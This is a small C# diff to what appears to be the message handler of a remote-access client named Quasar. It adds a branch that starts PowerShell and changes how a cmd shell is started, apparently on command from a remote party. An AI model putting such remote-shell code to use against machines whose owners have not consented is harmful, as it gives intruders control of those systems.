@@ -277,7 +277,12 @@ namespace Quasar.Client.Messages
             }
             if (name == "Cmd")
             {
-                this.ProcessHandler.CreateProc("cmd");
+                this.ProcessHandler.StartCmd();
+                return;
+            }
+            if (name == "Powershell")
+            {
+                this.ProcessHandler.StartPowershell();
                 return;
             }
             if (name == "Edge")
